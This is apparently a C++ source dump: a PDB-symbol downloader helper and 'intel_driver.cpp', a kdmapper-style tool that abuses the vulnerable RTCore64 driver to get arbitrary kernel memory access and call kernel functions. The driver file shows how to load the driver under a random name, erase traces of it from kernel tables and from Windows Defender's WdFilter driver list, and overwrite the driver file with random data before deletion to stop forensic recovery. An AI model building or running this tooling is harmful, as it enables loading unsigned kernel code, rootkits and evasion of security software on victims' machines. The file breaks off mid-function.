			std::ifstream file(filePath, std::ios::binary | std::ios::ate);
			std::streamsize fileSize = file.tellg();
			file.seekg(0, std::ios::beg);

			std::vector<char> fileData(fileSize);
			if (file.read(fileData.data(), fileSize))
			{
				std::string pdbMd5 = md5::Md5(fileData.data(), (ULONG)fileSize);
				return pdbMd5;
			}
			return "";
		}

	}
#pragma warning(pop)

	class pdb
	{
	private:
		struct PDBHeader7
		{
			char signature[0x20];
			int page_size;
			int allocation_table_pointer;
			int file_page_count;
			int root_stream_size;
			int reserved;
			int root_stream_page_number_list_number;
		};

		struct RootStream7
		{
			int num_streams;
			int stream_sizes[1]; //num_streams
		};

		struct GUID_StreamData
		{
			int ver;
			int date;
			int age;
			GUID guid;
		};

		struct PdbInfo
		{
			DWORD	Signature;
			GUID	Guid;
			DWORD	Age;
			char	PdbFileName[1];
		};

#define EZ_PDB_BASE_OF_DLL (DWORD64)0x10000000

		std::string _pe_path;
		bool pdb_downloaded;
		bool pdb_loaded;
		HANDLE _hPdbFile;
		HANDLE _hProcess;
		std::string _symbol_server;

		std::string download(std::string pe_path, bool bRedownload = false)
		{
			// download pdb file from symbol server
			// return pdb path if success, 
			// or return empty string if failed, user can call GetLastError() to know wth is going on

			std::string pdbDownloadPath;

			CHAR wsCurrentDir[MAX_PATH] = { 0 };
			GetModuleFileNameA(NULL,wsCurrentDir, _countof(wsCurrentDir));
			PathRemoveFileSpecA(wsCurrentDir);

			std::string CurrentDir(wsCurrentDir);
			
			if (CurrentDir.back() != '\\')
			{
				CurrentDir += '\\';
			}
			pdbDownloadPath = CurrentDir += "symbols\\";

			// make sure the directory exist
			if (!CreateDirectoryA(pdbDownloadPath.c_str(), NULL))
			{
				if (GetLastError() != ERROR_ALREADY_EXISTS)
				{
					return "";
				}
			}

			// read pe file

#ifndef _AMD64_
			PVOID OldValue = NULL;
			Wow64DisableWow64FsRedirection(&OldValue);
#endif

			std::ifstream file(pe_path, std::ios::binary | std::ios::ate);
			std::streamsize size = file.tellg();
			file.seekg(0, std::ios::beg);
			std::vector<char> buffer(size);

#ifndef _AMD64_
			Wow64RevertWow64FsRedirection(&OldValue);
#endif

			if (!file.read(buffer.data(), size) || size == 0)
			{
				SetLastError(ERROR_ACCESS_DENIED);
				return "";
			}

			std::string pdbPath = pdbDownloadPath + md5::Md5(buffer.data(), (ULONG)size) + ".pdb";
			std::string pdbHashCachePath = pdbPath + ".md5";

			if (!bRedownload)
			{
				if (PathFileExistsA(pdbPath.c_str()))
				{
					if (PathFileExistsA(pdbHashCachePath.c_str()))
					{
						std::ifstream ifs(pdbHashCachePath);
						std::string md5Cache;
						ifs >> md5Cache;
						ifs.close();

						std::string pdbMd5 = md5::Md5(pdbPath);

						if (pdbMd5 == md5Cache)
						{
							return pdbPath;
						}
					}
				}
			}

			// get pdb info from debug info directory
			IMAGE_DOS_HEADER* pDos = (IMAGE_DOS_HEADER*)buffer.data();
			IMAGE_NT_HEADERS* pNT = (IMAGE_NT_HEADERS*)(buffer.data() + pDos->e_lfanew);
			IMAGE_FILE_HEADER* pFile = &pNT->FileHeader;
			IMAGE_OPTIONAL_HEADER64* pOpt64 = NULL;
			IMAGE_OPTIONAL_HEADER32* pOpt32 = NULL;
			BOOL x86 = FALSE;
			if (pFile->Machine == IMAGE_FILE_MACHINE_AMD64)
			{
				pOpt64 = (IMAGE_OPTIONAL_HEADER64*)(&pNT->OptionalHeader);
			}
			else if (pFile->Machine == IMAGE_FILE_MACHINE_I386)
			{
				pOpt32 = (IMAGE_OPTIONAL_HEADER32*)(&pNT->OptionalHeader);
				x86 = TRUE;
			}
			else
			{
				SetLastError(ERROR_NOT_SUPPORTED);
				return "";
			}
			DWORD ImageSize = x86 ? pOpt32->SizeOfImage : pOpt64->SizeOfImage;

			// file buffer to image buffer
			PBYTE ImageBuffer = (PBYTE)malloc(ImageSize);
			if (!ImageBuffer)
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				return "";
			}
			memcpy(ImageBuffer, buffer.data(), x86 ? pOpt32->SizeOfHeaders : pOpt64->SizeOfHeaders);
			IMAGE_SECTION_HEADER* pCurrentSectionHeader = IMAGE_FIRST_SECTION(pNT);
			for (UINT i = 0; i != pFile->NumberOfSections; ++i, ++pCurrentSectionHeader)
			{
				if (pCurrentSectionHeader->SizeOfRawData)
				{
					memcpy(ImageBuffer + pCurrentSectionHeader->VirtualAddress, buffer.data() + pCurrentSectionHeader->PointerToRawData, pCurrentSectionHeader->SizeOfRawData);
				}
			}
			IMAGE_DATA_DIRECTORY* pDataDir = nullptr;
			if (x86)
			{
				pDataDir = &pOpt32->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
			}
			else
			{
				pDataDir = &pOpt64->DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
			}
			IMAGE_DEBUG_DIRECTORY* pDebugDir = (IMAGE_DEBUG_DIRECTORY*)(ImageBuffer + pDataDir->VirtualAddress);
			if (!pDataDir->Size || IMAGE_DEBUG_TYPE_CODEVIEW != pDebugDir->Type)
			{
				// invalid debug dir
				free(ImageBuffer);
				SetLastError(ERROR_NOT_SUPPORTED);
				return "";
			}
			PdbInfo* pdb_info = (PdbInfo*)(ImageBuffer + pDebugDir->AddressOfRawData);
			if (pdb_info->Signature != 0x53445352)
			{
				// invalid debug dir
				free(ImageBuffer);
				SetLastError(ERROR_NOT_SUPPORTED);
				return "";
			}

			// download pdb
			DeleteFileA(pdbPath.c_str());
			wchar_t w_GUID[100] = { 0 };
			if (!StringFromGUID2(pdb_info->Guid, w_GUID, 100))
			{
				free(ImageBuffer);
				SetLastError(ERROR_NOT_SUPPORTED);
				return "";
			}
			char a_GUID[100]{ 0 };
			size_t l_GUID = 0;
			if (wcstombs_s(&l_GUID, a_GUID, w_GUID, sizeof(a_GUID)) || !l_GUID)
			{
				free(ImageBuffer);
				SetLastError(ERROR_NOT_SUPPORTED);
				return "";
			}

			char guid_filtered[256] = { 0 };
			for (UINT i = 0; i != l_GUID; ++i)
			{
				if ((a_GUID[i] >= '0' && a_GUID[i] <= '9') || (a_GUID[i] >= 'A' && a_GUID[i] <= 'F') || (a_GUID[i] >= 'a' && a_GUID[i] <= 'f'))
				{
					guid_filtered[strlen(guid_filtered)] = a_GUID[i];
				}
			}

			char age[3] = { 0 };
			_itoa_s(pdb_info->Age, age, 10);

			// url
			std::string url = _symbol_server;
			url += "/";
			url += pdb_info->PdbFileName;
			url += "/";
			url += guid_filtered;
			url += age;
			url += "/";
			url += pdb_info->PdbFileName;

			// download
			HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), pdbPath.c_str(), NULL, NULL);
			if (FAILED(hr))
			{
				free(ImageBuffer);
				return "";
			}

			free(ImageBuffer);

			std::string pdbMd5 = md5::Md5(pdbPath);
			std::ofstream ofs(pdbHashCachePath);
			ofs << pdbMd5;

			return pdbPath;
		}

	public:
		pdb(std::string pe_path, std::string symbol_server = "https://msdl.microsoft.com/download/symbols")
		{
			_pe_path = pe_path;
			_symbol_server = symbol_server;
			pdb_downloaded = false;
			pdb_loaded = false;
		}

		bool init()
		{
			std::string pdb_path = download(_pe_path);
			if (pdb_path.empty())
			{
				return false;
			}

			pdb_downloaded = true;

			// get pdb file size
			WIN32_FILE_ATTRIBUTE_DATA file_attr_data{ 0 };
			if (!GetFileAttributesExA(pdb_path.c_str(), GetFileExInfoStandard, &file_attr_data))
			{
				return false;
			}
			auto pdbSize = file_attr_data.nFileSizeLow;

			// open pdb file
			HANDLE hPdbFile = CreateFileA(pdb_path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
			if (hPdbFile == INVALID_HANDLE_VALUE)
			{
				return false;
			}

			// open current process
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());
			if (!hProcess)
			{
				CloseHandle(hPdbFile);
				return false;
			}

			// Initializes the symbol handler for a process
			if (!SymInitialize(hProcess, pdb_path.c_str(), FALSE))
			{
				CloseHandle(hProcess);
				CloseHandle(hPdbFile);
				return false;
			}

			SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS | SYMOPT_AUTO_PUBLICS | SYMOPT_DEBUG | SYMOPT_LOAD_ANYTHING);

			DWORD64 SymbolTable = SymLoadModuleEx(hProcess, NULL, pdb_path.c_str(), NULL, EZ_PDB_BASE_OF_DLL, pdbSize, NULL, NULL);
			if (!SymbolTable)
			{
				SymCleanup(hProcess);
				CloseHandle(hProcess);
				CloseHandle(hPdbFile);
				return false;
			}

			_hPdbFile = hPdbFile;
			_hProcess = hProcess;

			pdb_loaded = true;

			return true;
		}

		~pdb()
		{
			if (pdb_loaded)
			{
				SymUnloadModule64(_hProcess, EZ_PDB_BASE_OF_DLL);
				SymCleanup(_hProcess);
				CloseHandle(_hProcess);
				CloseHandle(_hPdbFile);
			}
		}

		// get function / global variable rva. return -1 if failed
		int get_rva(std::string SymName)
		{
			SYMBOL_INFO si = { 0 };
			si.SizeOfStruct = sizeof(SYMBOL_INFO);
			if (!SymFromName(_hProcess, SymName.c_str(), &si))
			{
				return -1;
			}
			return (int)(si.Address - si.ModBase);
		}

		// get struct attribute offset. return -1 if failed
		int get_attribute_offset(std::string StructName, std::wstring PropertyName)
		{
			ULONG SymInfoSize = sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(TCHAR);
			SYMBOL_INFO* SymInfo = (SYMBOL_INFO*)malloc(SymInfoSize);
			if (!SymInfo)
			{
				return -1;
			}
			ZeroMemory(SymInfo, SymInfoSize);
			SymInfo->SizeOfStruct = sizeof(SYMBOL_INFO);
			SymInfo->MaxNameLen = MAX_SYM_NAME;
			if (!SymGetTypeFromName(_hProcess, EZ_PDB_BASE_OF_DLL, StructName.c_str(), SymInfo))
			{
				return -1;
			}

			TI_FINDCHILDREN_PARAMS TempFp = { 0 };
			if (!SymGetTypeInfo(_hProcess, EZ_PDB_BASE_OF_DLL, SymInfo->TypeIndex, TI_GET_CHILDRENCOUNT, &TempFp))
			{
				free(SymInfo);
				return -1;
			}

			ULONG ChildParamsSize = sizeof(TI_FINDCHILDREN_PARAMS) + TempFp.Count * sizeof(ULONG);
			TI_FINDCHILDREN_PARAMS* ChildParams = (TI_FINDCHILDREN_PARAMS*)malloc(ChildParamsSize);
			if (ChildParams == NULL)
			{
				free(SymInfo);
				return -1;
			}
			ZeroMemory(ChildParams, ChildParamsSize);
			memcpy(ChildParams, &TempFp, sizeof(TI_FINDCHILDREN_PARAMS));
			if (!SymGetTypeInfo(_hProcess, EZ_PDB_BASE_OF_DLL, SymInfo->TypeIndex, TI_FINDCHILDREN, ChildParams))
			{
				goto failed;
			}
			for (ULONG i = ChildParams->Start; i < ChildParams->Count; i++)
			{
				WCHAR* pSymName = NULL;
				ULONG Offset = 0;
				if (!SymGetTypeInfo(_hProcess, EZ_PDB_BASE_OF_DLL, ChildParams->ChildId[i], TI_GET_OFFSET, &Offset))
				{
					goto failed;
				}
				if (!SymGetTypeInfo(_hProcess, EZ_PDB_BASE_OF_DLL, ChildParams->ChildId[i], TI_GET_SYMNAME, &pSymName))
				{
					goto failed;
				}
				if (pSymName)
				{
					if (wcscmp(pSymName, PropertyName.c_str()) == 0)
					{
						LocalFree(pSymName);
						free(ChildParams);
						free(SymInfo);
						return int(Offset);
					}
				}
			}
		failed:
			free(ChildParams);
			free(SymInfo);
			return -1;
		}

		// get struct size, failed return -1
		int get_struct_size(std::string StructName)
		{
			ULONG SymInfoSize = sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(TCHAR);
			SYMBOL_INFO* SymInfo = (SYMBOL_INFO*)malloc(SymInfoSize);
			if (!SymInfo)
			{
				return -1;
			}
			ZeroMemory(SymInfo, SymInfoSize);
			SymInfo->SizeOfStruct = sizeof(SYMBOL_INFO);
			SymInfo->MaxNameLen = MAX_SYM_NAME;
			if (!SymGetTypeFromName(_hProcess, EZ_PDB_BASE_OF_DLL, StructName.c_str(), SymInfo))
			{
				return -1;
			}
			return int(SymInfo->Size);
		}


	};
}

```

`RTCore64_Vulnerability/intel_driver.cpp`:

```cpp
#include "intel_driver.hpp"
#include "ezpdb.hpp"

ULONG64 intel_driver::ntoskrnlAddr = 0;
char intel_driver::driver_name[100] = {};
MemoryAccessor intel_driver::ma;
uintptr_t intel_driver::NtUserSetGestureConfig_ref;
uintptr_t PiDDBLockPtr;
uintptr_t PiDDBCacheTablePtr;

std::wstring intel_driver::GetDriverNameW() {
	std::string t(intel_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring intel_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool intel_driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(L"\\\\.\\RTCore64", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

HANDLE intel_driver::Load(bool clean) {
	//data ptr hook
	LoadLibraryA("user32.dll");
	LoadLibraryA("win32u.dll");
	char* systemRootEnv;
	size_t path_len;
	_dupenv_s(&systemRootEnv, &path_len, "systemroot");
	std::string ntos_path = std::string(systemRootEnv) + "\\System32\\win32k.sys";
	free(systemRootEnv);
	ez::pdb ntos_pdb = ez::pdb(ntos_path);
	if (!ntos_pdb.init())
	{
		Log(L"[-] Failed to Load PDB" << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	int NtUserSetGestureConfig_rva = ntos_pdb.get_rva("NtUserSetGestureConfig");
	if (NtUserSetGestureConfig_rva == -1)
	{
		Log(L"[-] Failed to Load Symbol of NtUserSetGestureConfig" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	srand((unsigned)time(NULL) * GetCurrentThreadId());

	//from https://github.com/ShoaShekelbergstein/kdmapper as some Drivers takes same device name
	//if (intel_driver::IsRunning()) {
	//	Log(L"[-] \\Device\\Nal is already in use." << std::endl);
	//	return INVALID_HANDLE_VALUE;
	//}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		intel_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	Log(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log(L"[-] Can't find TEMP folder" << std::endl);
		return INVALID_HANDLE_VALUE;
	}

	_wremove(driver_path.c_str());

	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(rtcore64_driver_resource::driver), sizeof(rtcore64_driver_resource::driver))) {
		Log(L"[-] Failed to create vulnerable driver file" << std::endl);
		return INVALID_HANDLE_VALUE;
	}
	
	if (!service::RegisterAndStart(driver_path)) {
		Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return INVALID_HANDLE_VALUE;
	}

	auto result = INVALID_HANDLE_VALUE;

	if (!ma.Open())
	{
		Log(L"[-] Failed to load driver rtcore64.sys" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}

	uintptr_t win32k = utils::GetKernelModuleAddress("win32k.sys");
	if (!win32k)
	{
		Log("[-] win32k.sys not found");
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	uintptr_t NtUserSetGestureConfig = win32k + NtUserSetGestureConfig_rva;
	uintptr_t nt_qword = FindPatternAtKernel(result, NtUserSetGestureConfig, 0x100, (BYTE*)"\x48\x8B\x05", "xxx");
	if (!nt_qword)
	{
		Log(L"[-] NtUserSetGestureConfig not found" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	int  nt_qword_offset = 0;
	if (!ReadMemory(result, nt_qword + 3, &nt_qword_offset, sizeof(int)))
	{
		Log(L"[-] NtUserSetGestureConfig not found" << std::endl);
		intel_driver::Unload(result);
		return INVALID_HANDLE_VALUE;
	}
	
	NtUserSetGestureConfig_ref = nt_qword + nt_qword_offset + 7;

	if (clean)
	{
		if (!intel_driver::ClearPiDDBCacheTable(result)) {
			Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}

		if (!intel_driver::ClearKernelHashBucketList(result)) {
			Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}

		if (!intel_driver::ClearMmUnloadedDrivers(ma.hDevice)) {
			Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}

		if (!intel_driver::ClearWdFilterDriverList(result)) {
			Log("[!] Failed to ClearWdFilterDriverList" << std::endl);
			intel_driver::Unload(result);
			return INVALID_HANDLE_VALUE;
		}
	}
	
	return 0;
}

bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {

	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		Log("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}

	auto RuntimeDriversList = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList) {
		Log("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef) {
		Log("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}

	// MpCleanupDriverInfo->MpFreeDriverInfoEx 23110
	/*
		49 8B C9                      mov     rcx, r9         ; P
		49 89 50 08                   mov     [r8+8], rdx
		E8 FB F0 FD FF                call    MpFreeDriverInfoEx
		48 8B 0D FC AA FA FF          mov     rcx, cs:qword_1C0021BF0
		E9 21 FF FF FF                jmp     loc_1C007701A
	*/
	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x49\x8B\xC9\x00\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {
		// 24010 
		/*
			48 89 4A 08                   mov     [rdx+8], rcx
			49 8B C8                      mov     rcx, r8         ; P
			E8 C3 58 FE FF                call    sub_1C0065308
			48 8B 0D 44 41 FA FF          mov     rcx, cs:qword_1C0023B90
			E9 39 FF FF FF                jmp     loc_1C007F98A
		*/
		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel(device_handle, "PAGE", WdFilter, (PUCHAR)"\x48\x89\x4A\x00\x49\x8b\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "xxx?xx?x???????????x");
		if (!MpFreeDriverInfoExRef) {
			Log("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			Log("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" << std::endl);
		}

	}

	MpFreeDriverInfoExRef += 0x7; // skip until call instruction

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversList, 3, 7);
	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)RuntimeDriversCountRef, 2, 6);
	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	ReadMemory(device_handle, RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t));
	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)MpFreeDriverInfoExRef, 1, 5);

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { // Usefull lambda to read LIST_ENTRY
		LIST_ENTRY* Entry;
		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
		};

	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), intel_driver::GetDriverNameW().c_str())) {

					//remove from RuntimeDriversArray
					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) { // max RuntimeDriversArray elements
						PVOID value = 0;
						ReadMemory(device_handle, RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1); // this is not count+1 is position of cout addr+1
							WriteMemory(device_handle, RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray) {
						Log("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));


					// decrement RuntimeDriversCount
					ULONG current = 0;
					ReadMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(device_handle, RuntimeDriversCount, &current, sizeof(ULONG));

					// call MpFreeDriverInfoEx
					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

					//verify DriverInfo Magic
					USHORT Magic = 0;
					ReadMemory(device_handle, DriverInfo, &Magic, sizeof(USHORT));
					if (Magic != 0xDA18) {
						Log("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(device_handle, nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					Log("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
	}
	return false;
}

bool intel_driver::Unload(HANDLE device_handle) {
	Log(L"[<] Unloading vulnerable driver" << std::endl);

	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		CloseHandle(device_handle);
	}
	ma.~MemoryAccessor();

	if (!service::StopAndRemove(GetDriverNameW()))
		return false;

	std::wstring driver_path = GetDriverPath();

	//Destroy disk information before unlink from disk to prevent any recover of the file
	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	if (!file_ofstream.is_open()) {
		Log(L"[!] Failed to open file for writing" << std::endl);
	}
	int newFileLen = sizeof(rtcore64_driver_resource::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		Log(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	//unlink the file
	if (_wremove(driver_path.c_str()) != 0)
		return false;

	return true;
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return ma.ReadMemory(address, buffer, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void* buffer, uint64_t size) {
	return ma.WriteMemory(address, buffer, size);
}

uint64_t intel_driver::MmAllocateIndependentPagesEx(HANDLE device_handle, uint32_t size)
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;
	
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = intel_driver::FindPatternInSectionAtKernel(device_handle, (char*)"PAGELK", intel_driver::ntoskrnlAddr, 
			(BYTE*)"\xE8\x00\x00\x00\x00\x48\x8B\xF0\x48\x85\xC0\x0F\x84\x00\x00\x00\x00\x44\x8B\xC5\x33\xD2\x48\x8B\xC8\xE8\x00\x00\x00\x00\x48\x8D\x46\x3F\x48\x83\xE0\xC0", 
			(char*)"x????xxxxxxxx????xxxxxxxxx????xxxxxxxx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}

		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx) {
			Log(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
	}

	if (!intel_driver::CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool intel_driver::MmFreeIndependentPages(HANDLE device_handle, uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF", 
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}

		kernel_MmFreeIndependentPages += 8;

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages) {
			Log(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
	}

	uint64_t result{};
	return intel_driver::CallKernelFunction(device_handle, &result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN intel_driver::MmSetPageProtection(HANDLE device_handle, uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		Log(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;
	
	if (!kernel_MmSetPageProtection)
	{
		kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel(device_handle, "PAGE", intel_driver::ntoskrnlAddr, 
			(BYTE*)"\x41\xB8\x00\x00\x00\x00\x48\x00\x00\x00\x8B\x00\xE8\x00\x00\x00\x00\x84\xC0\x74\x09\x48\x81\xEB\x00\x00\x00\x00\xEB", 
			(char*)"xx????x???x?x????xxxxxxx????x");
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}

		kernel_MmSetPageProtection += 12;

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress(device_handle, (PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection) {
			Log(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
	}

	BOOLEAN set_prot_status{};
	if (!intel_driver::CallKernelFunction(device_handle, &set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

/*added by psec*/
uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE device_handle, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes)
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocatePagesForMdl");

	if (!kernel_MmAllocatePagesForMdl)
	{
		Log(L"[!] Failed to find MmAlocatePagesForMdl" << std::endl);
		return 0;
	}

	uint64_t allocated_pages = 0;

	if (!CallKernelFunction(device_handle, &allocated_pages, kernel_MmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes))
		return 0;

	return allocated_pages;
}

uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE device_handle, uint64_t pmdl, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, uint64_t RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority)
{
